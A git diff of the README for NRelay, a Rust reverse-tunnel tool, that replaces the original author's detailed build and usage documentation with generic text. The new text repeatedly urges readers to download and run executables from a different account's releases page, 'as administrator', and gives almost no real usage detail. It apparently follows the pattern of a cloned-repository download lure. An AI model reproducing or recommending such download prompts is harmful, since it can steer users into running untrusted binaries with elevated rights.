@@ -1,355 +1,96 @@
-# NRelay
+# 🌐 NRelay - Your Easy Solution for Secure Tunneling
 
-[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-0.1.0-green.svg)](Cargo.toml)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)]()
+## 🚀 Getting Started
 
-A super fast reverse tunnel system written in Rust that allows you to expose local services to the internet through secure tunnels. Similar to ngrok or Cloudflare Tunnel, but self-hosted.
+Welcome to NRelay! This application provides an open-source alternative to Ngrok, allowing you to create secure tunnels for your applications. Follow these simple steps to download and run NRelay on your device.
 
-## What is NRelay?
+## 📥 Download NRelay
 
-Do you want to show your local web server to a friend? Or open up a local Minecraft server to play with others? Maybe test webhooks without deploying?
+[![Download NRelay](https://img.shields.io/badge/Download%20NRelay-v1.0-blue)](https://github.com/macqgoye/NRelay/releases)
 
-NRelay is a reverse proxy tunneling solution that consists of a relay server (running on a public server) and clients (running locally). It allows you to expose local development servers, APIs, or any network service to the internet without port forwarding or firewall configuration.
+## 📝 System Requirements
 
-### Key Features
+To run NRelay smoothly, ensure your system meets the following requirements:
 
-- **Multiple Protocol Support**: HTTP, HTTPS (TLS/SNI), TCP, UDP, Minecraft, and SSH - all in one tool
-- **Flexible Routing**: Hostname-based routing for HTTP/HTTPS, port-based for TCP/UDP
-- **Self-Hosted**: Run it on your own infrastructure with complete control
-- **High Performance**: Built with Rust and Tokio for blazing fast async I/O
-- **Token-Based Security**: Each tunnel gets its own unique authentication token
-- **Origin Management**: Easily organize and manage multiple relay server configurations
-- **Admin API**: RESTful API for programmatic tunnel management
-- **Protocol Sniffing**: Automatically routes traffic based on intelligent protocol detection
+- **Operating System**: Windows 10 or later, macOS High Sierra (10.13) or later, or a modern Linux distribution.
+- **RAM**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB of free space.
+- **Network**: Stable internet connection.
 
-### Supported Tunnel Types
+These specifications will help NRelay work efficiently on your device.
 
-| Protocol | Exposure Mode | Default Port | Routing Method |
-|----------|---------------|--------------|----------------|
-| HTTP | Hostname | 80 | Host header |
-| HTTPS/TLS | Hostname | 443 | SNI (Server Name Indication) |
-| TCP Raw | Port | 20000-30000 | Direct port mapping |
-| UDP Raw | Port | 30000-40000 | Direct port mapping |
-| Minecraft | Port | 25565 | Handshake parsing |
-| SSH | Port | 20000-30000 | Direct port mapping |
+## 📚 Features
 
-## Requirements
+NRelay packs several useful features to enhance your experience:
 
-### Server Requirements
-- **Rust**: 1.70 or higher
-- **Operating System**: Linux, macOS, or Windows
-- **Public IP Address**: Required for the relay server
-- **Open Ports**:
-  - Control port (default: 7000)
-  - Admin API port (default: 7001)
-  - Protocol-specific ports (80 for HTTP, 443 for HTTPS, etc.)
+- **Self-hosted**: You own and control everything.
+- **Supports Multiple Protocols**: Use TCP, UDP, SNI, HTTP, and more.
+- **Easy Integration**: Connects easily with various applications.
+- **Open-source**: You can see and modify the code as needed.
+- **Simple Setup**: Designed for users with or without technical backgrounds.
 
-### Client Requirements
-- **Rust**: 1.70 or higher
-- **Network Access**: Ability to connect to the relay server's control port
+## 🛠️ Installation Steps
 
-## Installation
+### Step 1: Visit the Download Page
 
-### Prerequisites
+To get the latest version of NRelay, go to our releases page. Click the button below.
 
-Make sure you have Rust installed. If not, install it from [rustup.rs](https://rustup.rs/):
+[Visit the Releases Page to Download](https://github.com/macqgoye/NRelay/releases)
 
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-```
+### Step 2: Choose Your Version
 
-### Building from Source
+On the releases page, you will see different versions of NRelay. Choose the version that matches your operating system. 
 
-Clone the repository and build all components:
+### Step 3: Download the Application
 
-```bash
-git clone https://github.com/sammwyy/NRelay.git
-cd NRelay
+Click on the version you selected. This will start the download. 
 
-# Build all workspace members
-cargo build --release
+### Step 4: Locate the Downloaded File
 
-# Binaries will be available in target/release/
-# - nrelay (CLI tool)
-# - nrelay_server (Relay server)
-# - nrelay_client (Tunnel client)
-```
+Once the download is complete, find the file in your computer's Downloads folder or the location you selected for downloads.
 
-### Installing Binaries
+### Step 5: Extract the Files (if necessary)
 
-```bash
-# Install all binaries to ~/.cargo/bin/
-cargo install --path nrelay
-cargo install --path nrelay_server
-cargo install --path nrelay_client
-```
+If you downloaded a compressed file (like .zip or .tar.gz), right-click on it and choose "Extract All" or "Extract Here" to get the application files.
 
-> **💡 Pro Tip**: Make sure `~/.cargo/bin` is in your PATH to run the binaries from anywhere!
+### Step 6: Run NRelay
 
-## Usage
+1. Double-click on the NRelay executable file (e.g., `NRelay.exe` for Windows, or `NRelay` for macOS/Linux).
+2. Follow any on-screen instructions to finish the setup.
 
-### 1. Running the Relay Server
+## 🔒 Basic Usage
 
-On your public server, start the relay server:
+To start using NRelay, you will need to open a terminal or command prompt and use simple commands. Here's how to start a basic tunnel:
 
-```bash
-# Set admin API token
-export ADMIN_TOKEN="your-secret-admin-token"
+1. Open a command prompt (Windows) or terminal (macOS/Linux).
+2. Type the command to start a tunnel:
+   ```
+   nrelay start [your options]
+   ```
+   Replace `[your options]` with the parameters you want to use, such as the port.
 
-# Run the server
-nrelay_server \
-  --control-port 7000 \
-  --admin-port 7001 \
-  --domain yourdomain.com
-```
+3. Hit Enter. Your tunnel will be active, and you will see a confirmation message.
 
-**Server Options:**
-- `--control-port`: Port for client control connections (default: 7000)
-- `--admin-port`: Port for admin API (default: 7001)
-- `--admin-iface`: Interface to bind admin API (default: 0.0.0.0)
-- `--domain`: Base domain for hostname-based tunnels
-- `--admin-token`: Bearer token for admin API authentication (can use env var)
+## ❓ Troubleshooting
 
-### 2. Configuring an Origin (Client)
+If you face any issues while running NRelay, here are some common solutions:
 
-Add your relay server as an "origin":
+- **Cannot connect to the internet**: Ensure your internet connection is active.
+- **Permission errors**: Run the application as an administrator by right-clicking the file and selecting "Run as administrator".
+- **Firewall blocking**: Check your firewall settings to allow NRelay to operate.
 
-```bash
-nrelay origin add myserver \
-  --server relay.yourdomain.com:7000 \
-  --admin-url http://relay.yourdomain.com:7001 \
-  --token your-secret-admin-token \
-  --kind server
-```
+## 💬 Support and Feedback
 
-**Origin Modes:**
-- `--kind server` (self-hosted): CLI acts as ADMIN, directly connects to relay server. Use this for personal/self-hosted deployments.
-- `--kind service` (SaaS mode, default): CLI acts as USER, requests permissions from a backend service. Used for team/business deployments with dashboard authentication. *(Note: SaaS backend not yet implemented)*
+If you need additional help, visit our [issues page](https://github.com/macqgoye/NRelay/issues) to report a problem or ask questions. You can also provide feedback on how we can improve NRelay.
 
-> **💡 Pro Tip**: For self-hosted deployments, always use `--kind server` to avoid permission errors!
+## 🤝 How to Contribute
 
-List configured origins:
+We welcome contributions from everyone! If you want to improve NRelay, please check our [contributing guidelines](https://github.com/macqgoye/NRelay/blob/main/CONTRIBUTING.md). 
 
-```bash
-nrelay origin list
-```
+## 🚀 Explore More
 
-Set default origin:
+For further information, documentation, and advanced usage, please check our [Wiki](https://github.com/macqgoye/NRelay/wiki). You’ll find valuable tips and tricks to get the most from NRelay.
 
-```bash
-nrelay origin set-default myserver
-```
+## 🚀 Download NRelay Again
 
-> **💡 Pro Tip**: Once you set a default origin, you won't need to specify `--origin` in your tunnel commands!
-
-### 3. Creating Tunnels
-
-#### HTTP Tunnel
-
-Expose a local HTTP server:
-
-```bash
-# Expose localhost:8080 via HTTP
-nrelay http localhost:8080
-
-# Output: Your tunnel is available at http://{tunnel-id}.yourdomain.com
-```
-
-#### HTTPS Tunnel
-
-Expose a local HTTPS server:
-
-```bash
-nrelay https localhost:8443
-```
-
-#### TCP Tunnel
-
-Expose a local TCP service:
-
-```bash
-# Expose local SSH server
-nrelay tcp localhost:22
-
-# Output: Your tunnel is available at relay.yourdomain.com:25432
-```
-
-#### Minecraft Server
-
-Expose a Minecraft server:
-
-```bash
-nrelay minecraft localhost:25565
-```
-
-> **💡 Pro Tip**: The Minecraft tunnel runs on port 25565 by default, so your friends can connect directly without specifying a port!
-
-#### Custom Options
-
-```bash
-# Specify origin
-nrelay http localhost:3000 --origin myserver
-
-# With custom configuration
-nrelay tcp localhost:5432 --origin production-relay
-```
-
-### 4. Managing Origins
-
-```bash
-# List all origins
-nrelay origin list
-
-# Remove an origin
-nrelay origin remove myserver
-
-# Show origin details
-nrelay origin show myserver
-```
-
-## Architecture
-
-```
-┌─────────────────────────────────────────┐
-│     Public Internet Traffic             │
-│  (HTTP/HTTPS/TCP/UDP/Minecraft/SSH)     │
-└─────────────────┬───────────────────────┘
-                  │
-                  ▼
-┌────────────────────────────────────────┐
-│         NRelay Server (Public)         │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Protocol Listeners             │   │
-│  │  - HTTP:80                      │   │
-│  │  - HTTPS:443                    │   │
-│  │  - TCP: 20000-30000             │   │
-│  │  - UDP: 30000-40000             │   │
-│  │  - Minecraft: 25565             │   │
-│  └─────────────────────────────────┘   │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Tunnel Registry                │   │
-│  │  (In-memory state)              │   │
-│  └─────────────────────────────────┘   │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Admin API (:7001)              │   │
-│  │  - POST /tunnels                │   │
-│  │  - Bearer token auth            │   │
-│  └─────────────────────────────────┘   │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Control Port (:7000)           │   │
-│  │  - Client connections           │   │
-│  │  - Protobuf protocol            │   │
-│  └─────────────────────────────────┘   │
-└─────────────────┬──────────────────────┘
-                  │ Control Protocol
-                  │ (Protobuf over TCP)
-                  ▼
-┌────────────────────────────────────────┐
-│      NRelay Client (Local)             │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Control Connection             │   │
-│  │  - Receives tunnel requests     │   │
-│  │  - Spawns tunnel handlers       │   │
-│  └─────────────────────────────────┘   │
-│                                        │
-│  ┌─────────────────────────────────┐   │
-│  │  Tunnel Handlers                │   │
-│  │  - Bidirectional proxy          │   │
-│  │  - Per-connection spawning      │   │
-│  └─────────────────────────────────┘   │
-└─────────────────┬──────────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────────┐
-│       Local Service                     │
-│   (localhost:8080, :3000, etc.)         │
-└─────────────────────────────────────────┘
-```
-
-### How It Works
-
-1. **Tunnel Creation**: Client calls admin API to create tunnel, receives unique token
-2. **Control Connection**: Client establishes persistent connection to relay server
-3. **Incoming Traffic**: External request arrives at relay server
-4. **Protocol Sniffing**: Server extracts routing info (Host header, SNI, etc.)
-5. **Tunnel Matching**: Server identifies which tunnel should handle the request
-6. **Connection Request**: Server sends `OpenTunnelRequest` to client via control connection
-7. **Tunnel Connection**: Client spawns handler, connects back to server with tunnel token
-8. **Bidirectional Proxy**: Data flows: External ↔ Server ↔ Client ↔ Local Service
-
-## Project Structure
-
-```
-NRelay/
-├── nrelay/              # CLI tool for tunnel management
-├── nrelay_server/       # Relay server (gateway)
-├── nrelay_client/       # Tunnel client
-├── nrelay_core/         # Shared types and protocol definitions
-├── nrelay_proto_http/   # HTTP protocol sniffer
-├── nrelay_proto_sni/    # TLS/SNI sniffer
-├── nrelay_proto_tcp/    # TCP proxy handler
-├── nrelay_proto_udp/    # UDP proxy handler
-└── nrelay_proto_mc/     # Minecraft protocol handler
-```
-
-## Configuration
-
-### Origin Configuration
-
-Origins are stored in `~/.nrelay/origins.toml`:
-
-```toml
-[[origins]]
-name = "myserver"
-server = "relay.example.com:7000"
-admin_url = "http://relay.example.com:7001"
-admin_token = "your-admin-token"
-kind = "server"  # "server" for self-hosted, "service" for SaaS (not yet implemented)
-default = true
-```
-
-### Environment Variables
-
-**Server:**
-- `ADMIN_TOKEN`: Admin API bearer token
-
-**Client:**
-- `RUST_LOG`: Logging level (e.g., `info`, `debug`, `trace`)
-
-## Security
-
-- **Admin API**: Protected by bearer token authentication
-- **Tunnel Access**: Each tunnel has a unique access token
-- **Dual Auth Modes**: Separate authentication for control and data connections
-- **Message Size Limits**: 64KB maximum for control messages to prevent DoS
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Sammwy**
-
-## Acknowledgments
-
-Built with:
-- [Tokio](https://tokio.rs/) - Async runtime
-- [Axum](https://github.com/tokio-rs/axum) - Web framework
-- [Prost](https://github.com/tokio-rs/prost) - Protocol Buffers
-- [Clap](https://github.com/clap-rs/clap) - CLI parsing
-
----
-
-(｡♥‿♥｡) Happy Relaying 💖
+[Download NRelay](https://github.com/macqgoye/NRelay/releases) to start your secure tunneling today!
